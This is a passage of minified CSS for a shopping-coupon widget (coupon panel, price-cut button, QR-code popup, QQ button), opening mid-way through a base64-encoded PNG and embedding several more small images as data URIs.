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)}.dypMid9527-coupon-backImg i{display:inline-block;margin-right:3px;width:9px;height:13px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAANCAYAAAB7AEQGAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjQ3OTRERDY5OTIwRjExRTc5NkU5QjNEMEFENzkxNDY0IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjQ3OTRERDZBOTIwRjExRTc5NkU5QjNEMEFENzkxNDY0Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NDc5NERENjc5MjBGMTFFNzk2RTlCM0QwQUQ3OTE0NjQiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NDc5NERENjg5MjBGMTFFNzk2RTlCM0QwQUQ3OTE0NjQiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7eUH9cAAAA20lEQVR42mTRv8tBURjA8UOKUncgf8E7maRs3tVmVwYZkP/BYlDsBn+EP+BdLErJQEpMknoV8mNQYlDH9+S5nK6nPuf0PPe558e9Pq11Tym1QkV9Rxc3RVNbvyILZclLvWqSCE5YWw0ODhia3C2W5a2C5DXJf+0mY4QJolii4z4zQxgx5LBDH/9IyVFCpqmJK7b6Ew/scUbRx5Dkmj/wI446GpjJZxgrz7UzslLGrrs3uWOKjTSZeS5nywVYboAWjkighD/ZLoiFd7u0rJS2637Pv3JwkfkdTwEGAAZGJ/OukZtQAAAAAElFTkSuQmCC)}.dypMid9527-coupon-backImg p{color:#fff;font-size:12px;font-weight:700;width:130px;margin-left:16px;margin-top:4px;text-align:center;overflow:hidden;line-height:12px}.dypMid9527-coupon-backImg p.p1{font-size:16px;font-weight:700;height:28px;line-height:28px;margin-top:20px;text-indent:-6px}.dypMid9527-coupon-backImg p.p1 span{font-size:36px;display:inline-block;height:27px;line-height:27px;vertical-align:-2px;margin:0 6px}.dypMid9527-coupon-priceCut{height:26px;display:flex;justify-content:center;margin-top:15px;padding-bottom:10px;z-index:1;font-size:14px;color:#333}.dypMid9527-coupon-priceCut>div{cursor:pointer;position:relative}.dypMid9527-coupon-priceCutIcon{display:inline-block;width:18px;height:18px;vertical-align:-7px;margin-left:8px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAAaVBMVEUAAAD/Llz1Llf3Llf1Llf1LVf1Llf1LVb1LVb3L1n/OmP1Llb1LVb0LVb1LVb1Llb1Llb0Llj2Llf4L1j2Llz0Llf1Llf0Llf2Llf1LVb2Llf2MFb0LVb94ef95uv81Nz7tML3c470OV9h4d5FAAAAHHRSTlMAFUtAx4Pl4ttcCvbz7rarkXRTJRvZyMKinVg70oD1vAAAAIBJREFUGNN9yEcSwyAUBNEWSoBycP6O9z+kKYRkygv1YqbqEbJZZtmaRkCJKMBMuOZSwVCL1AOocgbaHDrxdZC3kJ7ASMhAduM8ulvpCNcL2kK1UgWJJncrWwk4+NHTEzHddykN9PhIGqQJ9H5Js5iWqIOnPqaevQqR4o9UUSqWvsQxD9WdYo6gAAAAAElFTkSuQmCC)}.dypMid9527-coupon-priceCutButt{display:inline-block}#dypMid9527-coupon-priceCutButt{width:100px;height:26px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAaCAMAAAB2FAnXAAAAeFBMVEUAAAA3NzczMzMzMzMzMzM8PDwzMzMzMzM5OTkzMzM0NDQ0NDQ0NDQzMzMzMzM0NDQ0NDQzMzMzMzMzMzP/J1MzMzMzMzMzMzM0NDQ0NDQ1NTX+JlEzMzM0NDQ0NDQ1NTU4ODgzMzMzMzMzMzP9JlH/J1FERET9JVBb+OZCAAAAJ3RSTlMAIOfSLhL9iwzeSW898XVjrci/lhqknFxPVjXnt3z2RhrYg2mmdwTHyGh3AAACFUlEQVRIx83W266jIBiG4Q8QUEEELO6qdde67v8OB9uVyTp1Jm3WmxAPn/ATFeByv369sev9Eo3r44I3dnlcL7g/8OYed0TnvcVZ4Qtv7+u3IDshZAbqHK+43YGZNThKF4CUzxKQ/mjW7VF6CiGCZQylcN77EcDmAVhLyRMRQOlUzCtslvrMdkyO45gl5xCKsSa3pU80bQD4EmjYrtwO5EZsbemb2KAOW9cAW40x5xHXutXamRkAXMzoigQYhhkqiNqUSxVjCmRdAlsJG7dtW84iaZFqcHoLiK2Cj4UGkAbavsYVSKxSyD2Tzmlm4gmdRia2TzW1Y5bVLS9EsiTtDHTcNBEhXUldjEakGvq61puRlWHnd0K84VjS3jTS3vgOpoHn1BNRlJwgNnPkNSURsVNTAziJoBpzKaWIK7HkxvEXkTfBZRG7xVXndOCUTcXAMmv7s8jkdaWUMEoRjgMp5heyJQJIWnQWsdz36H096HXQmp9FOpt7QKSIHQgp8EKeB19JdEwpleYs7pWtOVeB8/0kMtBGhmkS7TSRJ5K7nwirImKMSfOh6zqvB5dR584efJ9gCyEIG8J0ILtbfyCaurF5jasCEDTwTwd/9GNcJku/kU5SnrVpKDIpK5UXWZYVa1X5+HqaU8js8Yql3w85ITZExIQ2kQBS3ZRlr0cAY5c/07/vU///yEd+vx+5SHzkSvSRy90f221HyXoE/zEAAAAASUVORK5CYII=)}.dypMid9527-coupon-erweima{position:absolute;display:none;bottom:25px;left:-42px;width:172px;height:231px;text-align:center;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKwAAADnCAMAAAC0cE1FAAAATlBMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMAAADKysr5+fn+/v7s7Ozl5eUAAAAnJyf9/f1tbW3s7Oy+vr7x8fHf39////8K9fx2AAAAGXRSTlMABAkYDyIMFBEhGx9p4PSymich7TG4crRhw96B2gAAAqxJREFUeNrt3cuO4jAURdECO7ZjJwQC9fD//2ifPCqpbtQ9ALV0kfYeMlq6OoqHvL1sB4P9Q3o01l+8MzSE4A0lzgy+P6ukKcXoDBVjSvIK9+dZQ4oul9KqxkCtKiW7mMJ63N0afHRjN/SnaqhTP3Sjiz781MqaYu76arC+yzFJ++OwPuZzNdo5R6/T7iMwbJ21QdptBK6rhuuchrBh42hyr9/1YxR2XYHxw86n1Q5mbEh5qKYbcgrCLisoplegHRTtYMOaegvuO+1Y79pqvNZ5sFNgv7FNNV4DdgksWAUWrAILVoEFq8CCVWDBKrBgFViwCixYBRasAgtWgQWrwIJVYMEqsGAVWLAKLFgFFqwCC1aBBavAglVgwSqwYBVYsAosWAUWrAILVoEFq8CCVWDBKrBgFViwCixYBRasAgtWgQWrwIJVYMEqsGAVWLAKLFgFFqwCC1aBBavAglVgwSqwYBVYsAosWAUWrAILVoEFq8CCVWDBKrBgFViwCixYBRasAgtWgX1J7Ev9VTdYsMcQy6ma7lRi2LF9NV2/YQ8h5aGabsgpHBbsMbmumq5z6SjsuoPR9A76cV7BijV+Wh12w0ob87ma7ZyjrMKuWm9YK6tfrNsQYu5M7rbvcvwewTYEH93YDb2p1+HUD93ool9HsGun47pcSquaB7tcLh/1Rx/6oXmwVpWS3XTW1bprddyQUozuiXJpLu+79f3SlOyeKMaUQhB1t+7HlTf4h0tJwy+3a1273kqO+tE/XJB0PeudVh2fKvjkysc2guKS5vZUIq3We++TiZtc+76OoHXz3J7s7T91WJ6X23UZQY7L3Ky2PC9dVd30KTdM3bSftX7at0o7PS+36/U2fcqNW5fHMH19JR/MH3Z9DNXxBazSTtyj6e/Ab1r1IlZa+gUplf+BfvlVPwAAAABJRU5ErkJggg==)}.dypMid9527-coupon-erweimaImg img{width:110px;height:110px;margin:27px 0 0}.dypMid9527-coupon-erweimaTitle{padding:0 10px;height:21px;line-height:21px}.dypMid9527-erweima-mask{display:none;position:absolute;top:-2px;left:30px;border-bottom:2px solid #fff;height:0}.dypMid9527-coupon-priceCutQQ{display:block;margin-right:36px;width:100px;height:26px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAaCAMAAAB2FAnXAAAAk1BMVEVJyfIys+ha1vQysucAAABW0/Nc1/RY1fQxsuhY1fVS0PI3uOpBwO1Lye////9Gxe48vOtOzPHn+P3Z8/uo4/f1/P6x5via3/Vo0fLt+v2M3vWW3fXg9fyB2PRezvFszfHJ7vq36vl10vJNwu3Q7/rD7flYyO961/Njye+g4PZVw+2M2fSj4/dJwOxw1vO96fh70PGjTUQ8AAAACHRSTlMc6eqmAOampij0dnMAAALPSURBVEjHvZZZkpswEECZTFYsEFqREGJfB7zc/3RpYBhkp1L5GechI3W3ul+5yh/2vnrfv/x6Il++g8J7jsLVeN6PX0/nh/dtO/jLA+svz35lx6099v/R/M3z/wN/Si6F1sXliD9RQnyy4ifhSkLWHCwoqtb3k43eJ7MiPh99kix3WgVl